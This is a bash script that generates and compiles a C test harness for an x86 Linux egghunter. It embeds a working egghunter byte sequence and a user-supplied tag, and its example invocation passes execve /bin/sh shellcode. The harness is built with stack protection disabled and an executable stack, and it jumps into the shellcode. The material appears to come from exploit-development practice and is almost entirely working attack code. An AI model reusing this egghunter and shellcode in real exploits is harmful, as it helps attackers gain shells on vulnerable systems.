# Ex: ./compile.sh ABCD "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

echo '######### NASM #########'
echo '[+] Customizing Tag: '$1 # $1 Tag like: ABCD
tag=`echo -n $1 | xxd -ps | sed 's/[[:xdigit:]]\{2\}/\\\x&/g'`
echo '[+] Done!'

echo '[+] Customizing Shellcode: '$2 # $2 Shellcode: \x00\x01..
shellcode=$2
echo '[+] Done!'

echo '[+] Assemble shellcode C ...'

echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "#define EGG \"$tag\"" >>shellcode.c
echo "unsigned char shellcode[] = EGG" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"$shellcode\";" >>shellcode.c
echo "unsigned char egghunter[] = \"\x31\xd2\x66\x81\xca\xff\x0f\x42\"" >>shellcode.c
echo "                            \"\x8d\x5a\x04\x31\xc0\xb0\x21\xcd\x80\"" >>shellcode.c
echo "                            \"\x3c\xf2\x74\xed\xb8\"" >>shellcode.c
echo "                            EGG" >>shellcode.c
echo "                            \"\x89\xd7\xaf\x75\xe8\xaf\x75\xe5\"" >>shellcode.c
echo "                            \"\xff\xe7\";" >>shellcode.c
echo "void" >>shellcode.c
echo "main() {" >>shellcode.c
echo "    printf(\"Shellcode Length: %d\\n\", strlen(egghunter));" >>shellcode.c
echo "    int (*ret)() = (int(*)())egghunter;" >>shellcode.c
echo "    ret();" >>shellcode.c
echo "}" >>shellcode.c

echo '[+] Done!'

echo '[+] Assemble shellcode.c ...'
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode